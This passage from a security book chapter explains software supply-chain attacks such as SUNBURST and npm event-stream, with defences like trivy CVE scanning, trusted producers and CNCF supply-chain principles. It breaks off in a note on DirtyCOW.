<html><head></head><body><div id="sbo-rt-content"><section data-type="chapter" epub:type="chapter" data-pdf-bookmark="Chapter 4. Applications and Supply Chain"><div class="chapter" id="ch-apps-supply-chain">
<h1><span class="label">Chapter 4. </span>Applications and Supply Chain</h1>


<p>The
<a href="https://oreil.ly/19FGs">SUNBURST</a>
<a href="https://oreil.ly/coa9p">supply-chain
compromise</a> was a <a data-type="indexterm" data-primary="SUNBURST" data-secondary="overview" id="SUN_oview"/><a data-type="indexterm" data-primary="attacks" data-secondary="SUNBURST" data-tertiary="overview" id="attack_SUN_oview"/>hostile intrusion of US Government and Fortune-500 networks via malware hidden in a legitimately signed,
compromised server monitoring agent. The <a href="https://oreil.ly/gADiF">Cozy Bear hacking group</a> used
techniques described in this chapter to compromise many billion-dollar companies simultaneously. High value targets
were prioritized by the attackers, so smaller organizations may have escaped the potentially devastating consequences of
the breach.</p>

<p>Organizations targeted by the attackers suffered losses of data and may have been used as a springboard for further
attacks against their own customers. This is the essential risk of a “trusted” supply chain: anybody who consumes
something you produce becomes a potential target when you are compromised. The established trust relationship is exploited,
and so malicious software is inadvertently trusted.</p>

<p>Often vulnerabilities <a data-type="indexterm" data-primary="vulnerabilities" data-secondary="risk exposure" id="idm45302815730848"/>for which an exploit exists<a data-type="indexterm" data-primary="exploits" data-secondary="software patches and" id="idm45302815729712"/> don’t have a corresponding software patch or workaround. Palo Alto
research determined this is the case for 80% of new, public exploits. With this level of risk exposure for all running
software, denying malicious actors access to your internal networks is the primary line of defense.</p>

<p>The SUNBURST attack <a data-type="indexterm" data-primary="pipelines" data-secondary="SUNBURST attack" id="idm45302815727952"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="SUNBURST attack" id="idm45302815726944"/>infected SolarWinds <a data-type="indexterm" data-primary="SolarWinds" id="idm45302815725600"/>build pipelines and altered source code immediately before it was built, then
hid the evidence of tampering and ensured the binary was signed by the CI/CD system so consumers would trust it.</p>

<p>These techniques were previously unseen on the <a href="https://oreil.ly/BV0mN">Mitre ATT&amp;CK Framework</a>, and <a data-type="indexterm" data-primary="Mitre ATT&amp;CK Framework, SUNBURST attack" id="idm45302815723424"/>the attacks compromised
networks plundered for military, government, and company secrets—all enabled by the initial
supply chain attack. Preventing the ignoble, crafty Captain Hashjack and their pals from covertly entering the
organization’s network via any dependencies (libraries, tooling or otherwise) is the job of <em>supply chain security</em>: protecting our sources.</p>
<div class="clear">
<figure class="informal no-frame width-35"><div id="captain3" class="figure">
<img src="Images/haku_0000.png" alt="captain" width="1086" height="1103"/>
<h6/>
</div></figure>
<p>In this chapter we dive into supply chain attacks by looking at some historical issues and how they were exploited, then
see how containers can either usefully compartmentalize or dangerously exacerbate supply chain risks. In <a data-type="xref" href="#defending_against_sunburst">“Defending Against SUNBURST”</a>, we’ll ask: could we have secured a cloud native system from SUNBURST?</p>
<p>For career criminals like Captain Hashjack, the supply chain provides a fresh vector to assault BCTL’s systems: attack by proxy to gain trusted access to your systems. This means attacking container software supply chains to gain remote control of vulnerable workloads and servers, and daisy-chain exploits and backdoors throughout an organization.</p>
</div>






<section data-type="sect1" data-pdf-bookmark="Defaults"><div class="sect1" id="idm45302815716512">
<h1>Defaults</h1>

<p>Unless<a data-type="indexterm" data-primary="SUNBURST" data-secondary="overview" data-startref="SUN_oview" id="idm45302815715184"/><a data-type="indexterm" data-primary="attacks" data-secondary="SUNBURST" data-tertiary="overview" data-startref="attack_SUN_oview" id="idm45302815713904"/> targeted and mitigated, supply chain attacks<a data-type="indexterm" data-primary="supply chain attacks" id="idm45302815712224"/><a data-type="indexterm" data-primary="attacks" data-secondary="supply chains" id="idm45302815711552"/> are relatively simple: they impact trusted parts of our system that
we would not normally directly observe, like the CI/CD patterns of our suppliers.</p>

<p>This is a complex problem, as we will discuss in this chapter. As adversarial techniques evolve and cloud native systems adapt, you’ll see how the supply chain risks shift during development, testing, distribution, and runtime.</p>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Threat Model"><div class="sect1" id="idm45302815709440">
<h1>Threat Model</h1>

<p>Most applications<a data-type="indexterm" data-primary="applications" data-secondary="threat models" id="app_thrtmods"/><a data-type="indexterm" data-primary="supply chain attacks" data-secondary="threat models" id="supcatks_thrtmods"/> do not come hardened by default, and you need to spend time securing them. <a href="https://oreil.ly/5S6Qd">OWASP Application Security Verification Standard</a> provides <a data-type="indexterm" data-primary="OWASP Application Security Verification Standard" id="idm45302815704592"/><a data-type="indexterm" data-primary="application security (AppSec)" id="idm45302815703792"/><a data-type="indexterm" data-primary="AppSec (application security)" id="idm45302815703056"/>application security (AppSec) guidance that we will not explore any further, except to say: you don’t want to make an attacker’s life easy by running outdated or error-ridden software. Rigorous logic and security tests are essential for any and all software you run.</p>

<p>That extends from your developers’ coding style and web application security standards, to the supply chain for everything inside the container itself. Engineering effort is required to make them secure and ensure they are secure when updated.</p>

<p>Dependencies in the<a data-type="indexterm" data-primary="Software Development Life Cycle (SDLC)" data-see="SDLC (Software Development Life Cycle)" id="idm45302815700896"/><a data-type="indexterm" data-primary="SDLC (Software Development Life Cycle)" data-secondary="vulnerabilities" id="idm45302815699856"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="SDLC" id="idm45302815698896"/> SDLC are especially vulnerable to attack, and give opportunities to Captain Hashjack to run some
malicious code (the “payload”):</p>

<ul>
<li>
<p>At installation (package manager hooks, which may be running as root)</p>
</li>
<li>
<p>During development and test (IDEs, builds, and executing tests)</p>
</li>
<li>
<p>At runtime (local, dev, staging, and production Kubernetes pods)</p>
</li>
</ul>

<p class="less_space pagebreak-before">When a payload is executing, it may write further code to the filesystem or pull malware from the internet. It may
search for data on a developer’s laptop, a CI server, or production. Any looted credentials form the next phase of the
attack.</p>

<p>And applications are not the only software at risk: with infrastructure, policy, and security defined as code,
any scripted or automated point of the system that an attacker can infiltrate must be considered, and so is in scope
for your threat<a data-type="indexterm" data-primary="applications" data-secondary="threat models" data-startref="app_thrtmods" id="idm45302815693024"/><a data-type="indexterm" data-primary="supply chain attacks" data-secondary="threat models" data-startref="supcatks_thrtmods" id="idm45302815691776"/> model.</p>
</div></section>













<section data-type="sect1" data-pdf-bookmark="The Supply Chain"><div class="sect1" id="idm45302815690304">
<h1>The Supply Chain</h1>

<p>Software supply <a data-type="indexterm" data-primary="software supply chains" id="idm45302815688320"/><a data-type="indexterm" data-primary="supply chains" data-seealso="pipelines" id="idm45302815687584"/><a data-type="indexterm" data-primary="supply chains" data-secondary="software" id="idm45302815686640"/>chains (<a data-type="xref" href="#web-of-supply-chains">Figure 4-1</a>) consider the movement of your
files: source code, applications, data. They may be plain text, encrypted, on a floppy disk, or in the cloud.</p>

<p>Supply chains exist for anything that is built from other things—perhaps something
that humans ingest (food, medicine), use (a CPU, cars), or interact with (an operating system, open source software).
Any exchange of goods can be modeled as a supply chain, and some supply chains are huge and complex.</p>

<figure class="width-90"><div id="web-of-supply-chains" class="figure">
<img src="Images/haku_0401.png" alt="haku 0401" width="1425" height="854"/>
<h6><span class="label">Figure 4-1. </span>A web of supply chains; adapted from <a href="https://oreil.ly/r9ndi"><em class="hyperlink">https://oreil.ly/r9ndi</em></a></h6>
</div></figure>

<p>Each dependency<a data-type="indexterm" data-primary="dependencies" data-secondary="supply chain" id="idm45302815680160"/> you use is potentially a malicious implant primed to trigger, awaiting a spark of execution when it’s
run in your systems to deploy its payload. Container<a data-type="indexterm" data-primary="containers" data-secondary="supply chains" id="idm45302815678848"/> supply chains are long and may include:</p>

<ul>
<li>
<p>The base image(s)</p>
</li>
<li>
<p>Installed operating system packages</p>
</li>
<li>
<p>Application code and dependencies</p>
</li>
<li>
<p>Public Git repositories</p>
</li>
<li>
<p>Open source artifacts</p>
</li>
<li>
<p>Arbitrary files</p>
</li>
<li>
<p>Any other data that may be added</p>
</li>
</ul>

<p>If malicious code is added to your supply chain at any step, it may be loaded into executable memory in a running container in your Kubernetes cluster. This is Captain Hashjack’s goal with malicious payloads: sneak bad code into your trusted software and use it to launch an attack from inside the perimeter of your organization, where you may not have defended your systems as well on the assumption that the “perimeter” will keep attackers out.</p>

<p>Each link of a supply chain has a <a data-type="indexterm" data-primary="producers, supply chains" id="idm45302815669680"/><a data-type="indexterm" data-primary="consumers, supply chains" id="idm45302815668912"/>producer and a consumer. In <a data-type="xref" href="#app-example-supply-chains">Table 4-1</a>, the CPU chip producer is the manufacturer, and the next consumer is the distributor. In practice, there may be multiple producers and consumers at each stage of the supply chain.</p>
<table id="app-example-supply-chains">
<caption><span class="label">Table 4-1. </span>Varied example supply chains</caption>
<thead>
<tr>
<th/>
<th>Farm food</th>
<th>CPU chip</th>
<th>An open source software package</th>
<th>Your organization’s servers</th>
</tr>
</thead>
<tbody>
<tr>
<td><p><em>original producer</em></p></td>
<td><p>Farmer (seeds, feed, harvester)</p></td>
<td><p>Manufacturer (raw materials, fab, firmware)</p></td>
<td><p>Open source package developer (ingenuity, code)</p></td>
<td><p>Open source software, original source code built in internal CI/CD</p></td>
</tr>
<tr>
<td><p><em>(links to)</em></p></td>
<td><p>Distributor (selling to shops or other distributors)</p></td>
<td><p>Distributor (selling to shops or other distributors)</p></td>
<td><p>Repository maintainer (npm, PyPi, etc.)</p></td>
<td><p>Signed code artifacts pushed over the network to production-facing registry</p></td>
</tr>
<tr>
<td><p><em>(links to)</em></p></td>
<td><p>Local food shop</p></td>
<td><p>Vendor or local computer shop</p></td>
<td><p>Developer</p></td>
<td><p>Artifacts at rest in registry ready for deployment</p></td>
</tr>
<tr>
<td><p><em>links to final consumer</em></p></td>
<td><p>End user</p></td>
<td><p>End user</p></td>
<td><p>End user</p></td>
<td><p>Latest artifacts deployed to production systems</p></td>
</tr>
</tbody>
</table>

<p>Any stage in the supply<a data-type="indexterm" data-primary="supply chains" data-secondary="vulnerability of" id="idm45302815647488"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="supply chains" id="idm45302815646512"/> chain that is not under your direct control is liable to be attacked
(<a data-type="xref" href="#app-similarity-between-supply-chains">Figure 4-2</a>). A compromise of any “upstream” stage—for example, one that you consume—may impact you as a downstream consumer.</p>

<p>For example, an open source software <a data-type="indexterm" data-primary="open source" data-secondary="software" data-tertiary="vulnerabilities" id="idm45302815644032"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="open source software" id="idm45302815642784"/>project (<a data-type="xref" href="#app-open-source-supply-chain-attack">Figure 4-3</a>) may have three contributors (or “trusted producers”) with permission to merge external code contributions into the codebase. If one of those contributors’ passwords is stolen, an attacker can add their own malicious code to the project. Then, when your developers pull that dependency into their codebase, they are running the attacker’s hostile code on your internal systems.</p>

<figure><div id="app-similarity-between-supply-chains" class="figure">
<img src="Images/haku_0402.png" alt="Similarity between supply chains" width="1419" height="519"/>
<h6><span class="label">Figure 4-2. </span>Similarity between supply chains</h6>
</div></figure>

<figure><div id="app-open-source-supply-chain-attack" class="figure">
<img src="Images/haku_0403.png" alt="Open source supply chain attack" width="1389" height="424"/>
<h6><span class="label">Figure 4-3. </span>Open source supply chain attack</h6>
</div></figure>

<p>But the compromise doesn’t have to be malicious. As with the <a href="https://oreil.ly/UCKUv">npm <code>event-stream</code> vulnerability</a>, sometimes <a data-type="indexterm" data-primary="npm event-stream vulnerability" id="idm45302815634960"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="npm event-stream" id="idm45302815634160"/>it’s something as  innocent as someone looking to pass on maintainership to an existing and credible maintainer, who then goes rogue and inserts their own payload.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>In this case the vulnerable <code>event-stream</code> package was downloaded 12 million times, and was depended upon by more than 1,600 other packages. The payload searched for “hot cryptocurrency wallets” to steal from developers’ machines. If this had stolen SSH and GPG keys instead and used them to propagate the attack further, the compromise could have been much wider.</p>
</div>

<p>A successful supply chain attack is often difficult to detect, as a consumer trusts every upstream producer.
If a single producer is compromised, the attacker may target individual downstream consumers or pick only the highest-value targets.</p>








<section data-type="sect2" data-pdf-bookmark="Software"><div class="sect2" id="idm45302815630240">
<h2>Software</h2>

<p>For our purposes, the <a data-type="indexterm" data-primary="software development" data-secondary="security considerations" id="idm45302815628576"/>supply chains we consume are for software and hardware. In a cloud environment, a datacenter’s
physical and network security is managed by the provider, but it is your responsibility to secure your use of the
system. This means we have high confidence that the hardware we are using is safe. Our usage of it—the software we
install and its behavior—is where our supply chain risk starts.</p>

<p>Software is built from many other pieces of software. Unlike CPU manufacturing, where inert components are assembled
into a structure, software is more like a symbiotic population of cooperating organisms. Each component may be
autonomous and choosing to cooperate (CLI tools, servers, OS) or useless unless used in a certain way (<code>glibc</code>, linked
libraries, most application dependencies). Any software can be autonomous or cooperative, and it is impossible to
conclusively prove which it is at any moment in time. This means test code (unit tests, acceptance tests) may still
contain malicious code, which would start to explore the Continuous Integration (CI) build environment or the
developer’s machine it is executed on.</p>

<p>This poses a conundrum: if malicious code can be hidden in any part of a system, how can we conclusively say that the
entire system is secure?</p>

<p>As Liz Rice points out in <a href="https://oreil.ly/uzvnv"><em>Container Security</em></a> (O’Reilly):</p>
<blockquote>
<p>It’s very likely that a deployment of any non-trivial software will include some vulnerabilities, and there is a risk
that systems will be attacked through them. To manage this risk, you need to be able to identify which vulnerabilities
are present and assess their severity, prioritize them, and have processes in place to fix or mitigate these issues.</p></blockquote>

<p>Software supply <a data-type="indexterm" data-primary="software supply chains" data-secondary="management considerations" id="idm45302815622096"/>chain management is difficult. It requires you to accept some level of risk and make sure that
reasonable measures are in place to detect dangerous software before it is executed inside your systems. This risk is
balanced with diminishing rewards—builds get more expensive and more difficult to maintain with each control, and
there are much higher expenses for each step.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>Full confidence in your supply chain is almost impossible without the full spectrum of controls detailed in the CNCF Security Technical Advisory Group paper on software supply chain security (addressed later in this chapter).</p>
</div>

<p>As ever, you assume that no control is entirely effective and run <a data-type="indexterm" data-primary="intrusion detection" data-secondary="software development" id="idm45302815618752"/>intrusion detection on the build machines as the
last line of defense against targeted or widespread 
<span class="keep-together">zero-day</span> vulnerabilities that may have included SUNBURST,
Shellshock, or DirtyCOW, (see <a data-type="xref" href="#architecting-apps-resilience">“Architecting Containerized Apps for Resilience”</a>).</p>

<p>Now let’s look at how to secure a software supply chain, starting with minimum viable cloud native security: scanning for CVEs.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Scanning for CVEs"><div class="sect2" id="idm45302815629616">
<h2>Scanning for CVEs</h2>

<p>CVEs are published for<a data-type="indexterm" data-primary="software supply chains" data-secondary="CVEs, scanning for" id="softsc_CVE_scan"/><a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="software supply chains, scanning" id="CVE_ssc_s"/><a data-type="indexterm" data-primary="security" data-secondary="CVEs" data-tertiary="software supply chains, scanning" id="sec_CVE_ss"/> known vulnerabilities, and it is critical that you do not give Captain Hashjack’s gruesome crew
easy access to your systems by ignoring or failing to patch them. Open source software lists its dependencies in its build instructions (<em>pom.xml</em>, <em>package.json</em>, <em>go.mod</em>, <em>requirements.txt</em>, <em>Gemfile</em>, etc.), which gives us visibility of its
composition. This means you should scan those dependencies for CVEs using tools like
<a href="https://oreil.ly/wLyXO">trivy</a>. This is <a data-type="indexterm" data-primary="trivy" id="idm45302815606272"/>the lowest-hanging fruit in the defense of the supply chain and
should be considered a part of the minimum viable container security 
<span class="keep-together">processes.</span></p>

<p>trivy can scan code at rest in various places:</p>

<ul>
<li>
<p>In a container image</p>
</li>
<li>
<p>In a filesystem</p>
</li>
<li>
<p>In a Git repository</p>
</li>
</ul>

<p>It reports on known vulnerabilities. Scanning for CVEs is minimum viable security for shipping code to production.</p>

<p>This command scans the local directory and finds the <code>gomod</code> and <code>npm</code> dependency files,
reporting on their contents (output was edited to fit):</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code><code>trivy</code><code> </code><code>fs</code><code> </code><code>.</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO1-1" href="#callout_applications_and_supply_chain_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code>
</code><code>2021-02-22T10:11:32.657+0100</code><code>    </code><code>INFO</code><code>    </code><code>Detected</code><code> </code><code>OS:</code><code> </code><code>unknown</code><code>
</code><code>2021-02-22T10:11:32.657+0100</code><code>    </code><code>INFO</code><code>    </code><code>Number</code><code> </code><code>of</code><code> </code><code>PL</code><code> </code><code>dependency</code><code> </code><code>files:</code><code> </code><code>2</code><code>
</code><code>2021-02-22T10:11:32.657+0100</code><code>    </code><code>INFO</code><code>    </code><code>Detecting</code><code> </code><code>gomod</code><code> </code><code>vulnerabilities...</code><code>
</code><code>2021-02-22T10:11:32.657+0100</code><code>    </code><code>INFO</code><code>    </code><code>Detecting</code><code> </code><code>npm</code><code> </code><code>vulnerabilities...</code><code>

</code><code>infra/build/go.sum</code><code>
</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code>
</code><code>Total:</code><code> </code><code class="m">2</code><code> </code><code class="o">(</code><code>UNKNOWN:</code><code> </code><code>0,</code><code> </code><code>LOW:</code><code> </code><code>0,</code><code> </code><code>MEDIUM:</code><code> </code><code>0,</code><code> </code><code>HIGH:</code><code> </code><code>2,</code><code> </code><code>CRITICAL:</code><code> </code><code>0</code><code class="o">)</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO1-2" href="#callout_applications_and_supply_chain_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a><code>

</code><code>+-----------------------------+------------------+----------+-------------...</code><code>
</code><code class="p">|</code><code>           </code><code>LIBRARY</code><code>           </code><code class="p">|</code><code> </code><code>VULNERABILITY</code><code> </code><code>ID</code><code> </code><code class="p">|</code><code> </code><code>SEVERITY</code><code> </code><code class="p">|</code><code>         </code><code>INST...</code><code>
</code><code>+-----------------------------+------------------+----------+-------------...</code><code>
</code><code class="p">|</code><code> </code><code>github.com/dgrijalva/jwt-go</code><code> </code><code class="p">|</code><code> </code><code>CVE-2020-26160</code><code>   </code><code class="p">|</code><code> </code><code>HIGH</code><code>     </code><code class="p">|</code><code> </code><code>3.2.0+incomp...</code><code>
</code><code class="p">|</code><code>                             </code><code class="p">|</code><code>                  </code><code class="p">|</code><code>          </code><code class="p">|</code><code>             </code><code>...</code><code>
</code><code class="p">|</code><code>                             </code><code class="p">|</code><code>                  </code><code class="p">|</code><code>          </code><code class="p">|</code><code>             </code><code>...</code><code>
</code><code>+-----------------------------+------------------+</code><code>          </code><code>+-------------...</code><code>
</code><code class="p">|</code><code> </code><code>golang.org/x/crypto</code><code>         </code><code class="p">|</code><code> </code><code>CVE-2020-29652</code><code>   </code><code class="p">|</code><code>          </code><code class="p">|</code><code> </code><code>0.0.0-202006...</code><code>
</code><code class="p">|</code><code>                             </code><code class="p">|</code><code>                  </code><code class="p">|</code><code>          </code><code class="p">|</code><code>             </code><code>...</code><code>
</code><code class="p">|</code><code>                             </code><code class="p">|</code><code>                  </code><code class="p">|</code><code>          </code><code class="p">|</code><code>             </code><code>...</code><code>
</code><code class="p">|</code><code>                             </code><code class="p">|</code><code>                  </code><code class="p">|</code><code>          </code><code class="p">|</code><code>             </code><code>...</code><code>
</code><code>+-----------------------------+------------------+----------+-------------...</code><code>

</code><code>infra/api/code/package-lock.json</code><code>
</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code class="o">=</code><code>
</code><code>Total:</code><code> </code><code class="m">0</code><code> </code><code class="o">(</code><code>UNKNOWN:</code><code> </code><code>0,</code><code> </code><code>LOW:</code><code> </code><code>0,</code><code> </code><code>MEDIUM:</code><code> </code><code>0,</code><code> </code><code>HIGH:</code><code> </code><code>0,</code><code> </code><code>CRITICAL:</code><code> </code><code>0</code><code class="o">)</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO1-3" href="#callout_applications_and_supply_chain_CO1-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_applications_and_supply_chain_CO1-1" href="#co_applications_and_supply_chain_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>Run trivy against the filesystem (<code>fs</code>) in the current working directory (<code>.</code>).</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO1-2" href="#co_applications_and_supply_chain_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>Scanning has found two high-severity vulnerabilities in <em>infra/build/go.sum</em>.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO1-3" href="#co_applications_and_supply_chain_CO1-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a></dt>
<dd><p>The <em>infra/api/code/package-lock.json</em> has no vulnerabilities detected.</p></dd>
</dl>

<p>So we can scan code in our supply chain to see if it’s got vulnerable dependencies. But what about the code <a data-type="indexterm" data-primary="software supply chains" data-secondary="CVEs, scanning for" data-startref="softsc_CVE_scan" id="idm45302815488416"/><a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="software supply chains, scanning" data-startref="CVE_ssc_s" id="idm45302815398160"/><a data-type="indexterm" data-primary="security" data-secondary="CVEs" data-tertiary="software supply chains, scanning" data-startref="sec_CVE_ss" id="idm45302815396912"/>itself?</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Ingesting Open Source Software"><div class="sect2" id="idm45302815497040">
<h2>Ingesting Open Source Software</h2>

<p>Securely ingesting code <a data-type="indexterm" data-primary="software" data-secondary="ingesting" id="idm45302815495040"/><a data-type="indexterm" data-primary="open source" data-secondary="software" data-tertiary="ingesting" id="idm45302815494064"/>is hard: how can we prove that a container image was built from the same source we can see on GitHub? Or that a compiled application is the same open source code we’ve read, without rebuilding it from source?</p>

<p>While this is hard with open source, closed source presents even greater challenges.</p>

<p>How do we establish and verify trust with our suppliers?</p>

<p>Much to the Captain’s dismay, this problem has been studied since 1983, when Ken Thompson introduced <a href="https://oreil.ly/NEMQR">“Reflections on Trusting Trust”</a>:</p>
<blockquote>
<p>To what extent should one trust a statement that a program is free of Trojan horses? Perhaps it is more important to trust the people who wrote the software.</p></blockquote>

<p>The question of trust underpins many human interactions, and is the foundation of the original internet. Thompson continues:</p>
<blockquote>
<p>The moral is obvious. You can’t trust code that you did
not totally create yourself. (Especially code from companies that employ people like me.) No amount of
source-level verification or scrutiny will protect you
from using untrusted code… As the level of program gets lower, these bugs will be harder and harder to detect. A well installed microcode bug will be almost impossible to detect.</p></blockquote>

<p>These philosophical questions of security affect your organization’s supply chain, as well as your customers. The core problem remains unsolved and difficult to correct entirely.</p>

<p>While BCTL’s traditional relationship with software was defined previously as a consumer, when you started public open source on GitHub, you became a producer too. This distinction exists in most enterprise organizations today, as most have not adapted to their new producer responsibilities.</p>
</div></section>













<section data-type="sect2" class="less_space pagebreak-before" data-pdf-bookmark="Which Producers Do We Trust?"><div class="sect2" id="idm45302815496480">
<h2>Which Producers Do We Trust?</h2>

<p>To secure a supply<a data-type="indexterm" data-primary="supply chains" data-secondary="producer examples" id="idm45302815579024"/> chain we must have trust in our producers. These are parties outside of your organization and they
may include:</p>

<ul>
<li>
<p>Security providers such as the root Certificate Authorities to authenticate other servers on a network, and DNSSEC to return the right address for our 
<span class="keep-together">transmission</span></p>
</li>
<li>
<p>Cryptographic algorithms and implementations like GPG, RSA, and Diffie-Hellman to secure our data in transit and at rest</p>
</li>
<li>
<p>Hardware enablers like OS, CPU/firmware, and driver vendors to provide us low-level hardware interaction</p>
</li>
<li>
<p>Application developers and package maintainers to prevent malicious code installation via their distributed packages</p>
</li>
<li>
<p>Open source and community-run teams, organizations, and standards bodies, to grow our technologies and communities in the common interest</p>
</li>
<li>
<p>Vendors, distributors, and sales agents to not install backdoors or malware</p>
</li>
<li>
<p>Everybody—not to have exploitable bugs</p>
</li>
</ul>

<p>You may be wondering <a data-type="indexterm" data-primary="supply chains" data-secondary="hardening" id="idm45302815570880"/>if it’s ever possible to secure this entirely, and the answer is no. Nothing is ever entirely
secure, but everything can be hardened so that it’s less appealing to all except the most skilled of threat actors. It’s
all about balancing layers of security <a data-type="indexterm" data-primary="security controls" data-secondary="supply chain hardening" id="idm45302815569472"/>controls that might include:</p>

<ul>
<li>
<p>Physical second factors (2FA)</p>

<ul>
<li>
<p>GPG signing (e.g., Yubikeys)</p>
</li>
<li>
<p><a href="https://webauthn.io">WebAuthn</a>, FIDO2 Project, and physical security tokens (e.g., RSA)</p>
</li>
</ul>
</li>
<li>
<p>Human redundancy</p>

<ul>
<li>
<p>Authors cannot merge their own PRs</p>
</li>
<li>
<p>Adding a second person to sign-off critical processes</p>
</li>
</ul>
</li>
<li>
<p>Duplication by running the same process twice in different environments and comparing results</p>

<ul>
<li>
<p><a href="https://oreil.ly/c5Gm0">reprotest</a> and the <a href="https://oreil.ly/VsONj">Reproducible Builds</a> initiative (see examples in <a href="https://oreil.ly/rwWoH">Debian</a> and <a href="https://oreil.ly/mgVwV">Arch Linux</a>)</p>
</li>
</ul>
</li>
</ul>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="CNCF Security Technical Advisory Group"><div class="sect1" id="idm45302815545536">
<h1>CNCF Security Technical Advisory Group</h1>

<p>The CNCF Security Technical Advisory Group<a data-type="indexterm" data-primary="CNCF Security Technical Advisory Group, overview" id="idm45302815564304"/> (<em>tag-security</em>) published a
definitive <a href="https://oreil.ly/rEEd7">software supply chain security paper</a>. For an in-depth and immersive view of the field, it is strongly recommended reading:</p>
<blockquote>
<p>It evaluates many of the available tools and defines four key principles for supply chain security <a data-type="indexterm" data-primary="supply chains" data-secondary="security" data-tertiary="principles" id="idm45302815341744"/>and steps for each, including:</p>
<ol>
<li>
<p>Trust: Every step in a supply chain should be “trustworthy” due to a combination of cryptographic attestation and verification.</p>
</li>
<li>
<p>Automation: Automation is critical to supply chain security and can significantly reduce the possibility of human error and configuration drift.</p>
</li>
<li>
<p>Clarity: The build environments used in a supply chain should be clearly defined, with limited scope.</p>
</li>
<li>
<p>Mutual Authentication: All entities operating in the supply chain environment must be required to mutually authenticate using hardened authentication mechanisms with regular key rotation.</p>
</li>

</ol>
<p data-type="attribution">Software Supply Chain Best Practices, <cite>tag-security</cite></p>
</blockquote>

<p>It then covers the main parts of <a data-type="indexterm" data-primary="supply chains" data-secondary="security" data-tertiary="components" id="idm45302815565280"/>supply chain security:</p>
<ol>
<li>
<p>Source code (what your developers write)</p>
</li>
<li>
<p>Materials (dependencies of the app and its environment)</p>
</li>
<li>
<p>Build pipelines <a data-type="indexterm" data-primary="pipelines" data-secondary="supply chain security" id="idm45302815459472"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="supply chains" id="idm45302815458464"/>(to test and build your app)</p>
</li>
<li>
<p>Artifacts (your app plus test evidence and signatures)</p>
</li>
<li>
<p>Deployments (how your consumers access your app)</p>
</li>

</ol>

<p>If your supply chain is compromised at any one of these points, your consumers may be compromised too.</p>








<section data-type="sect2" data-pdf-bookmark="Architecting Containerized Apps for Resilience"><div class="sect2" id="architecting-apps-resilience">
<h2>Architecting Containerized Apps for Resilience</h2>

<p>You should adopt <a data-type="indexterm" data-primary="applications" data-secondary="containerized" id="idm45302815468832"/>an adversarial mindset when architecting and building systems so security considerations are baked in. Part of that mindset includes learning about historical vulnerabilities<a data-type="indexterm" data-primary="historical vulnerabilities, importance of" id="idm45302815589600"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="historical, importance of" id="idm45302815588832"/> in order to defend yourself against similar attacks.</p>

<p>The granular security policy of a container is an opportunity to reconsider applications as “compromised-by-default,” and configure them so they’re better protected against zero-day or unpatched vulnerabilities.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>One such historical vulnerability was<a data-type="indexterm" data-primary="DirtyCOW" id="idm45302815373344"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="DirtyCOW" id="idm45302815372640"/> DirtyCOW: a race condition in the Linux kernel’s privileged memory mapping code that allowed
unprivileged local users to escalate to root.</p>

<p>The bug allowed an attacker to gain a root shell
on the host, and was exploitable from inside a <a data-type="indexterm" data-primary="container breakouts" data-secondary="DirytCOW vulnerability" id="idm45302815447376"/>container that didn’t block <code>ptrace</code>. One of the authors live demoed
